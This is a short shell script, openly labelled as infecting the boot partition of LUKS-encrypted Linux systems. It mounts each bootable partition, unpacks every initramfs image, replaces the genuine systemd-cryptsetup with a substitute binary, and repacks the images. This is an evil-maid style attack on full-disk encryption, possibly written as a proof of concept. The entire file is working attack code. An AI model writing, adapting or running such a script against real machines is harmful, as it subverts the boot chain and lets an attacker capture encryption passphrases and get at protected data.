#!/bin/sh

# Infect the boot partition used by LUKS

bootroot="/mnt/boot_infect"
mkdir -p $bootroot/boot

sector_lines="`/sbin/fdisk -l 2> /dev/null  | /bin/grep '^/dev/'`"
sectors=`echo "$sector_lines" | /bin/grep "\*" | /bin/sed 's#^\(/dev/[a-zA-Z1-9]*\).*#\1#'`

for sector in $sectors; do
	mount $sector $bootroot/boot

	cd $bootroot/boot
	for initr in `ls initramfs-3*.img`; do
		mkdir initramfs
		cd initramfs
		gunzip < ../$initr | cpio -i
		cd lib/systemd
		# Copy the real systemd-cryptsetup
		mv systemd-cryptsetup $bootroot/$initr-systemd-cryptsetup.old
		# And replace it with ours
		cp $bootroot/systemd-cryptsetup .
		cd ../..
		find ./ | cpio -H newc -o > initramfs.cpio
		gzip initramfs.cpio
		mv initramfs.cpio.gz ../$initr
		cd ..
		rm -rf initramfs
	done
	cd ..
	umount $bootroot/boot
done
rm -rf $bootroot/boot



